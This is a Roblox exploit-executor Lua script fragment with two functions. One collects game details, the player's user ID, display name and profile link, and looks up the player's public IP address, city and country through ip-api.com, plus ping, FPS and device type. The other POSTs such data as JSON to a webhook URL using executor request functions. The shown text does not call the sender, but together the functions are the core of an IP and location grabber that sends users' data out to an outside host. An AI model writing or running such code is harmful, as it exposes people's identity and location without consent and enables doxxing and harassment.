local function getPlayerInfo()
    local placeId = game.PlaceId
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
    end)
    local gameName    = success and productInfo.Name or "Unknown"
    local creatorName = success and productInfo.Creator.Name or "Unknown"
    local gameLink    = "https://www.roblox.com/games/" .. placeId
    local gameThumbnail = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=768&height=432&format=png"
    
    local userId      = player.UserId
    local displayName = player.DisplayName
    local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
    local profileLink    = "https://www.roblox.com/users/" .. userId .. "/profile"

    local ip, city, country = "Unknown", "Unknown", "Unknown"
    pcall(function()
        local ipResponse = game:HttpGet("http://ip-api.com/json/")
        local ipData = HttpService:JSONDecode(ipResponse)
        ip      = ipData.query   or "Unknown"
        city    = ipData.city    or "Unknown"
        country = ipData.country or "Unknown"
    end)

    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    local fps  = math.floor(1 / RunService.RenderStepped:Wait())

    local deviceType = "PC"
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        deviceType = "Mobile"
    elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
        deviceType = "Console"
    end

    return {
        gameName = gameName, creatorName = creatorName, gameLink = gameLink,
        gameThumbnail = gameThumbnail, userId = userId, displayName = displayName,
        avatarHeadshot = avatarHeadshot, profileLink = profileLink,
        ip = ip, city = city, country = country, ping = ping, fps = fps, deviceType = deviceType
    }
end

local function sendToWebhook(url, payload)
    local json = HttpService:JSONEncode(payload)
    local req = syn and syn.request or http_request or request or game.HttpPost
    if req then
        pcall(function()
            req({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
        end)
    end
end

